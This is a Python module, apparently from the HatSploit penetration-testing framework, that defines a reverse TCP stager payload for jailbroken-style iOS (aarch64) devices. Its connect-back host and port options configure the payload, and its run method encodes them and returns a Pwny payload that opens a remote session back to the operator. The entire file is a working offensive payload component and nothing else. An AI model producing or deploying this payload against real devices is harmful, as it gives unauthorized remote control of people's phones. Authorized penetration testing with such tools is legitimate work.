#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from hatsploit.utils.tcp import TCPClient

from hatsploit.external.pwny.pwny import Pwny
from hatsploit.external.pwny.session import HatSploitSession


class HatSploitPayload(Payload, Pwny):
    details = {
        'Category': "stager",
        'Name': "iPhoneOS armle Pwny Reverse TCP",
        'Payload': "iphoneos/aarch64/pwny_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Pwny reverse TCP payload for iPhoneOS aarch64.",
        'Comments': [
            ''
        ],
        'Architecture': "aarch64",
        'Platform': "iphoneos",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'CBHOST': {
            'Description': "Connect-back host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'CBPORT': {
            'Description': "Connect-back port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    payload = {
        'Session': HatSploitSession
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)

        payload_args = self.encode_args(connback_host, connback_port)
        self.payload['Args'] = payload_args

        return self.get_payload(self.details['Platform'],
                                self.details['Architecture'])